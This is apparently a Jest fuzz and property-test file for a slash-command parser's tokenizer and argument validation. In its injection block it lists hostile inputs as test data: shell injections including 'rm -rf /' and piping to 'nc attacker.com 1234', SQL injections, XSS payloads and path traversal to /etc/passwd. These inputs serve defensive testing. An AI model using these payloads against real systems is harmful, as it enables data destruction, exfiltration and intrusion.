/**
 * Property-Based and Fuzz Tests for Command Parser
 *
 * Tests command parsing security with:
 * - Random command inputs
 * - Injection attempts
 * - Quote handling
 * - Unicode edge cases
 */

import { describe, it, expect } from "@jest/globals";
import * as fc from "fast-check";
import {
  tokenize,
  extractCommandInfo,
  parseArgs,
  parseAndValidateArg,
  parseInput,
} from "../command-parser";
import type { PluginArgSchema, PluginCommand } from "../types";

// ============================================================================
// TOKENIZER - Property Tests
// ============================================================================

describe("Tokenizer - Property Tests", () => {
  it("should always return an array", () => {
    fc.assert(
      fc.property(fc.string(), (input) => {
        const result = tokenize(input);
        expect(Array.isArray(result)).toBe(true);
      }),
      { numRuns: 2000 },
    );
  });

  it("should never throw on any input", () => {
    fc.assert(
      fc.property(fc.string(), (input) => {
        expect(() => tokenize(input)).not.toThrow();
      }),
      { numRuns: 2000 },
    );
  });

  it("should preserve quoted strings", () => {
    fc.assert(
      fc.property(
        // Exclude quote chars and \ from both parts to avoid confusing the tokenizer's
        // quote-state machine (single-quote, double-quote, backtick all open quote contexts)
        fc
          .string()
          .filter(
            (s) =>
              !s.includes('"') &&
              !s.includes("'") &&
              !s.includes("`") &&
              !s.includes("\\"),
          ),
        fc.string().filter((s) => !s.includes('"') && !s.includes("\\")),
        (before, quoted) => {
          const input = `${before} "${quoted}"`;
          const tokens = tokenize(input);
          if (quoted) {
            expect(tokens).toContain(quoted);
          }
        },
      ),
      { numRuns: 1000 },
    );
  });

  it("should handle escaped quotes", () => {
    fc.assert(
      fc.property(fc.string(), (str) => {
        const input = `"test\\"${str}"`;
        const tokens = tokenize(input);
        expect(Array.isArray(tokens)).toBe(true);
      }),
      { numRuns: 1000 },
    );
  });

  it("should split on spaces outside quotes", () => {
    fc.assert(
      fc.property(
        // Filter out spaces and quote chars to avoid creating extra tokens or merging tokens
        fc.array(
          fc
            .string({ minLength: 1 })
            .filter(
              (s) =>
                !s.includes(" ") &&
                !s.includes('"') &&
                !s.includes("'") &&
                !s.includes("\\"),
            ),
          { minLength: 1, maxLength: 10 },
        ),
        (words) => {
          const input = words.join(" ");
          const tokens = tokenize(input);
          expect(tokens.length).toBeLessThanOrEqual(words.length);
        },
      ),
      { numRuns: 1000 },
    );
  });

  it("should handle empty input", () => {
    const tokens = tokenize("");
    expect(tokens).toEqual([]);
  });

  it("should handle only whitespace", () => {
    fc.assert(
      fc.property(
        // fc.stringOf was removed in fast-check v4 — use array+join instead
        fc.array(fc.constantFrom(" ", "\t", "\n")).map((arr) => arr.join("")),
        (whitespace) => {
          const tokens = tokenize(whitespace);
          expect(Array.isArray(tokens)).toBe(true);
        },
      ),
      { numRuns: 500 },
    );
  });
});

// ============================================================================
// COMMAND INFO EXTRACTION - Property Tests
// ============================================================================

describe("Command Info Extraction - Property Tests", () => {
  it("should return null for non-commands", () => {
    fc.assert(
      fc.property(
        fc.string().filter((s) => !s.trim().startsWith("/")),
        (input) => {
          const result = extractCommandInfo(input);
          expect(result).toBeNull();
        },
      ),
      { numRuns: 1000 },
    );
  });

  it("should never throw on any input", () => {
    fc.assert(
      fc.property(fc.string(), (input) => {
        expect(() => extractCommandInfo(input)).not.toThrow();
      }),
      { numRuns: 2000 },
    );
  });

  it("should extract simple commands", () => {
    fc.assert(
      fc.property(fc.stringMatching(/^[a-z][a-z0-9_-]*$/), (cmd) => {
        const input = `/${cmd}`;
        const result = extractCommandInfo(input);
        if (result) {
          expect(result.bareName).toBe(cmd);
          expect(result.isNamespaced).toBe(false);
        }
      }),
      { numRuns: 1000 },
    );
  });

  it("should extract namespaced commands", () => {
    fc.assert(
      fc.property(
        fc.stringMatching(/^[a-z0-9_.-]+$/),
        fc.stringMatching(/^[a-z][a-z0-9_-]*$/),
        (namespace, cmd) => {
          const input = `/${namespace}:${cmd}`;
          const result = extractCommandInfo(input);
          if (result) {
            expect(result.namespace).toBe(namespace.toLowerCase());
            expect(result.bareName).toBe(cmd.toLowerCase());
            expect(result.isNamespaced).toBe(true);
          }
        },
      ),
      { numRuns: 1000 },
    );
  });

  it("should handle commands with arguments", () => {
    fc.assert(
      fc.property(
        fc.stringMatching(/^[a-z][a-z0-9_-]*$/),
        fc.string(),
        (cmd, args) => {
          const input = `/${cmd} ${args}`;
          const result = extractCommandInfo(input);
          if (result) {
            expect(result.bareName).toBe(cmd);
            // extractCommandInfo trims the rest field
            expect(result.rest).toBe(args.trim());
          }
        },
      ),
      { numRuns: 1000 },
    );
  });
});

// ============================================================================
// ARGUMENT PARSING - Property Tests
// ============================================================================

describe("Argument Parsing - Property Tests", () => {
  it("should never throw on any input", () => {
    fc.assert(
      fc.property(
        fc.string(),
        fc.array(
          fc.record({
            name: fc.string({ minLength: 1 }),
            type: fc.constantFrom(
              "string",
              "number",
              "boolean",
              "user",
              "channel",
            ),
            required: fc.boolean(),
            default: fc.anything(),
          }) as fc.Arbitrary<PluginArgSchema>,
        ),
        (input, schema) => {
          expect(() => parseArgs(input, schema)).not.toThrow();
        },
      ),
      { numRuns: 1000 },
    );
  });

  it("should always return args and errors arrays", () => {
    fc.assert(
      fc.property(
        fc.string(),
        fc.array(
          fc.record({
            name: fc.string({ minLength: 1 }),
            type: fc.constantFrom("string", "number", "boolean"),
            required: fc.boolean(),
            default: fc.anything(),
          }) as fc.Arbitrary<PluginArgSchema>,
        ),
        (input, schema) => {
          const result = parseArgs(input, schema);
          expect(result).toHaveProperty("args");
          expect(result).toHaveProperty("errors");
          expect(result).toHaveProperty("rawArgs");
          expect(Array.isArray(result.errors)).toBe(true);
          expect(Array.isArray(result.rawArgs)).toBe(true);
        },
      ),
      { numRuns: 1000 },
    );
  });

  it("should mark required fields as errors when missing", () => {
    fc.assert(
      fc.property(
        fc.array(
          fc.record({
            name: fc.string({ minLength: 1 }),
            type: fc.constantFrom("string", "number", "boolean"),
            required: fc.constant(true),
            default: fc.constant(undefined),
          }) as fc.Arbitrary<PluginArgSchema>,
          { minLength: 1, maxLength: 5 },
        ),
        (schema) => {
          const result = parseArgs("", schema);
          expect(result.errors.length).toBeGreaterThan(0);
          result.errors.forEach((err) => {
            expect(err.type).toBe("missing_required");
          });
        },
      ),
      { numRuns: 500 },
    );
  });
});

// ============================================================================
// STRING ARGUMENT VALIDATION - Property Tests
// ============================================================================

describe("String Argument Validation - Property Tests", () => {
  it("should accept any string when no constraints", () => {
    fc.assert(
      fc.property(
        // Empty string returns schema.default (undefined), not ""; use minLength: 1
        fc.string({ minLength: 1 }),
        (value) => {
          const schema: PluginArgSchema = {
            name: "test",
            type: "string",
            required: false,
          };
          const result = parseAndValidateArg(value, schema);
          expect(result.value).toBe(value);
          expect(result.error).toBeUndefined();
        },
      ),
      { numRuns: 1000 },
    );
  });

  it("should enforce minLength", () => {
    fc.assert(
      fc.property(
        // Empty string bypasses minLength (returns default); use minLength: 1 to exclude it
        fc.string({ maxLength: 5, minLength: 1 }),
        (value) => {
          const schema: PluginArgSchema = {
            name: "test",
            type: "string",
            required: false,
            minLength: 10,
          };
          const result = parseAndValidateArg(value, schema);
          if (value.length < 10) {
            expect(result.error).toBeDefined();
            expect(result.error?.type).toBe("validation_failed");
          }
        },
      ),
      { numRuns: 500 },
    );
  });

  it("should enforce maxLength", () => {
    fc.assert(
      fc.property(fc.string({ minLength: 20 }), (value) => {
        const schema: PluginArgSchema = {
          name: "test",
          type: "string",
          required: false,
          maxLength: 10,
        };
        const result = parseAndValidateArg(value, schema);
        if (value.length > 10) {
          expect(result.error).toBeDefined();
        }
      }),
      { numRuns: 500 },
    );
  });

  it("should enforce pattern matching", () => {
    fc.assert(
      fc.property(
        fc.string().filter((s) => !/^[0-9]+$/.test(s)),
        (value) => {
          const schema: PluginArgSchema = {
            name: "test",
            type: "string",
            required: false,
            pattern: "^[0-9]+$", // Only digits
          };
          const result = parseAndValidateArg(value, schema);
          if (value && !/^[0-9]+$/.test(value)) {
            expect(result.error?.type).toBe("validation_failed");
          }
        },
      ),
      { numRuns: 500 },
    );
  });
});

// ============================================================================
// NUMBER ARGUMENT VALIDATION - Property Tests
// ============================================================================

describe("Number Argument Validation - Property Tests", () => {
  it("should parse valid numbers", () => {
    fc.assert(
      fc.property(fc.double(), (num) => {
        const schema: PluginArgSchema = {
          name: "test",
          type: "number",
          required: false,
        };
        const result = parseAndValidateArg(num.toString(), schema);
        if (!isNaN(num) && isFinite(num)) {
          expect(typeof result.value).toBe("number");
        }
      }),
      { numRuns: 1000 },
    );
  });

  it("should reject non-numeric strings", () => {
    fc.assert(
      fc.property(
        fc.string().filter((s) => isNaN(Number(s))),
        (value) => {
          const schema: PluginArgSchema = {
            name: "test",
            type: "number",
            required: false,
          };
          const result = parseAndValidateArg(value, schema);
          if (value && isNaN(Number(value))) {
            expect(result.error?.type).toBe("invalid_type");
          }
        },
      ),
      { numRuns: 500 },
    );
  });

  it("should enforce min constraint", () => {
    fc.assert(
      fc.property(fc.integer({ max: 0 }), (num) => {
        const schema: PluginArgSchema = {
          name: "test",
          type: "number",
          required: false,
          min: 10,
        };
        const result = parseAndValidateArg(num.toString(), schema);
        if (num < 10) {
          expect(result.error).toBeDefined();
        }
      }),
      { numRuns: 500 },
    );
  });

  it("should enforce max constraint", () => {
    fc.assert(
      fc.property(fc.integer({ min: 100 }), (num) => {
        const schema: PluginArgSchema = {
          name: "test",
          type: "number",
          required: false,
          max: 50,
        };
        const result = parseAndValidateArg(num.toString(), schema);
        if (num > 50) {
          expect(result.error).toBeDefined();
        }
      }),
      { numRuns: 500 },
    );
  });
});

// ============================================================================
// BOOLEAN ARGUMENT VALIDATION - Property Tests
// ============================================================================

describe("Boolean Argument Validation - Property Tests", () => {
  it("should parse true values", () => {
    const trueValues = ["true", "yes", "1", "on", "TRUE", "YES", "ON"];
    trueValues.forEach((value) => {
      const schema: PluginArgSchema = {
        name: "test",
        type: "boolean",
        required: false,
      };
      const result = parseAndValidateArg(value, schema);
      expect(result.value).toBe(true);
      expect(result.error).toBeUndefined();
    });
  });

  it("should parse false values", () => {
    const falseValues = ["false", "no", "0", "off", "FALSE", "NO", "OFF"];
    falseValues.forEach((value) => {
      const schema: PluginArgSchema = {
        name: "test",
        type: "boolean",
        required: false,
      };
      const result = parseAndValidateArg(value, schema);
      expect(result.value).toBe(false);
      expect(result.error).toBeUndefined();
    });
  });

  it("should reject non-boolean strings", () => {
    fc.assert(
      fc.property(
        fc
          .string()
          .filter(
            (s) =>
              !["true", "yes", "1", "on", "false", "no", "0", "off"].includes(
                s.toLowerCase(),
              ),
          ),
        (value) => {
          const schema: PluginArgSchema = {
            name: "test",
            type: "boolean",
            required: false,
          };
          if (value) {
            const result = parseAndValidateArg(value, schema);
            expect(result.error?.type).toBe("invalid_type");
          }
        },
      ),
      { numRuns: 500 },
    );
  });
});

// ============================================================================
// USER/CHANNEL MENTION VALIDATION - Property Tests
// ============================================================================

describe("User/Channel Mention Validation - Property Tests", () => {
  it("should accept @username format", () => {
    fc.assert(
      fc.property(fc.stringMatching(/^[a-zA-Z0-9_-]+$/), (username) => {
        const schema: PluginArgSchema = {
          name: "test",
          type: "user",
          required: false,
        };
        const result = parseAndValidateArg(`@${username}`, schema);
        expect(result.value).toBe(username);
        expect(result.error).toBeUndefined();
      }),
      { numRuns: 500 },
    );
  });

  it("should accept plain username", () => {
    fc.assert(
      fc.property(fc.stringMatching(/^[a-zA-Z0-9_-]+$/), (username) => {
        const schema: PluginArgSchema = {
          name: "test",
          type: "user",
          required: false,
        };
        const result = parseAndValidateArg(username, schema);
        expect(result.value).toBe(username);
      }),
      { numRuns: 500 },
    );
  });

  it("should reject usernames with spaces", () => {
    fc.assert(
      fc.property(
        fc.string().filter((s) => s.includes(" ")),
        (username) => {
          const schema: PluginArgSchema = {
            name: "test",
            type: "user",
            required: false,
          };
          if (username.trim()) {
            const result = parseAndValidateArg(username, schema);
            expect(result.error?.type).toBe("invalid_type");
          }
        },
      ),
      { numRuns: 500 },
    );
  });

  it("should accept #channel format", () => {
    fc.assert(
      fc.property(fc.stringMatching(/^[a-zA-Z0-9_-]+$/), (channel) => {
        const schema: PluginArgSchema = {
          name: "test",
          type: "channel",
          required: false,
        };
        const result = parseAndValidateArg(`#${channel}`, schema);
        expect(result.value).toBe(channel);
        expect(result.error).toBeUndefined();
      }),
      { numRuns: 500 },
    );
  });
});

// ============================================================================
// CHOICES VALIDATION - Property Tests
// ============================================================================

describe("Choices Validation - Property Tests", () => {
  it("should accept values in choices list", () => {
    fc.assert(
      fc.property(
        fc.array(fc.string({ minLength: 1 }), { minLength: 1, maxLength: 5 }),
        (choices) => {
          const schema: PluginArgSchema = {
            name: "test",
            type: "string",
            required: false,
            choices,
          };
          const choice = choices[0];
          const result = parseAndValidateArg(choice, schema);
          expect(result.error).toBeUndefined();
        },
      ),
      { numRuns: 500 },
    );
  });

  it("should reject values not in choices list", () => {
    fc.assert(
      fc.property(
        fc.string({ minLength: 1 }),
        fc
          .array(fc.string({ minLength: 1 }), { minLength: 1 })
          .filter((arr) => !arr.includes("INVALID")),
        (value, choices) => {
          const schema: PluginArgSchema = {
            name: "test",
            type: "string",
            required: false,
            choices,
          };
          if (!choices.includes(value)) {
            const result = parseAndValidateArg(value, schema);
            expect(result.error?.type).toBe("validation_failed");
          }
        },
      ),
      { numRuns: 500 },
    );
  });
});

// ============================================================================
// INJECTION ATTEMPT DETECTION - Fuzz Tests
// ============================================================================

describe("Injection Attempt Detection - Fuzz Tests", () => {
  it("should handle command injection attempts", () => {
    const injectionAttempts = [
      "/cmd; rm -rf /",
      "/cmd && cat /etc/passwd",
      "/cmd | nc attacker.com 1234",
      "/cmd `whoami`",
      "/cmd $(id)",
      "/cmd > /dev/null",
    ];

    injectionAttempts.forEach((attempt) => {
      expect(() => parseInput(attempt)).not.toThrow();
    });
  });

  it("should handle SQL injection attempts", () => {
    const sqlInjections = [
      "/cmd ' OR '1'='1",
      "/cmd '; DROP TABLE users;--",
      "/cmd 1' UNION SELECT * FROM passwords--",
    ];

    sqlInjections.forEach((attempt) => {
      expect(() => parseInput(attempt)).not.toThrow();
    });
  });

  it("should handle XSS attempts", () => {
    const xssAttempts = [
      "/cmd <script>alert(1)</script>",
      "/cmd <img src=x onerror=alert(1)>",
      "/cmd javascript:alert(1)",
      "/cmd <svg/onload=alert(1)>",
    ];

    xssAttempts.forEach((attempt) => {
      expect(() => parseInput(attempt)).not.toThrow();
    });
  });

  it("should handle path traversal attempts", () => {
    const traversalAttempts = [
      "/cmd ../../../../etc/passwd",
      "/cmd ..\\..\\..\\windows\\system32",
      "/cmd %2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ];

    traversalAttempts.forEach((attempt) => {
      expect(() => parseInput(attempt)).not.toThrow();
    });
  });
});

// ============================================================================
// UNICODE EDGE CASES - Fuzz Tests
// ============================================================================

describe("Unicode Edge Cases - Fuzz Tests", () => {
  it("should handle unicode in command names", () => {
    fc.assert(
      fc.property(fc.string({ minLength: 1, maxLength: 20 }), (unicode) => {
        const input = `/${unicode}`;
        expect(() => parseInput(input)).not.toThrow();
      }),
      { numRuns: 500 },
    );
  });

  it("should handle emoji in arguments", () => {
    fc.assert(
      fc.property(fc.string(), (emoji) => {
        const input = `/test ${emoji}`;
        expect(() => parseInput(input)).not.toThrow();
      }),
      { numRuns: 500 },
    );
  });

  it("should handle RTL override characters", () => {
    const rtlChars = ["\u202E", "\u202D", "\u061C"];
    rtlChars.forEach((char) => {
      const input = `/cmd test${char}value`;
      expect(() => parseInput(input)).not.toThrow();
    });
  });

  it("should handle zero-width characters", () => {
    const zeroWidth = ["\u200B", "\u200C", "\u200D", "\uFEFF"];
    zeroWidth.forEach((char) => {
      const input = `/cmd${char}test`;
      expect(() => parseInput(input)).not.toThrow();
    });
  });
});
